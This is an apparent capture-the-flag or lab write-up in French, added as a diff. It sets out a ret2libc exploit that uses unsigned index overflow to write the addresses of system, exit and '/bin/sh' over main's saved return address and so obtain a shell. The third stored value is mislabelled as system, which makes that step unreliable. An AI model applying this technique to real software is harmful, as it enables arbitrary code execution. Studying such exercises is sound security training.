@@ -1,0 +1,22 @@
+Idee generale : enregistrer un number a un index plus loin que 100 et reecrire ainsi une adresse qui va etre executee
+
+- on remarque qu'a la suite du tableau, dans la stack, on trouve l'eip du main (0xf7e45513 a 0xffffd70c), index 114
+    (b *0x08048688 + x/148wx $esp)
+
+- on prepare donc un ret to libc pour stocker
+    - system  a l'index 114
+    - exit    a l'index 115
+    - /bin/sh a l'index 116
+
+- probleme : 114 est un multiple de 3, donc passe dans un "if" qui empeche de sauvegarder un number
+    => trouver un nombre positif (car %u scanf) qui, une fois multiplie par 4 amene a l'index 114 (est egal a 114 * 4 = 456)
+    (UINT_MAX + 1)/4 + 114 = 4294967296 / 4 + 114 = 1073741938
+
+
+- on lance le programme et on store donc
+
+    1) 4159090384 (system = 0xf7e6aed0) a l'index 1073741938 (114)
+    2) 4159040368 (exit = 0xf7e5eb70) a l'index 115
+    3) 4160264172 (system = 0xf7e6aed0) a l'index 116
+
+    4) on lance quit => pour appeler system() stocke dans l'eip du main
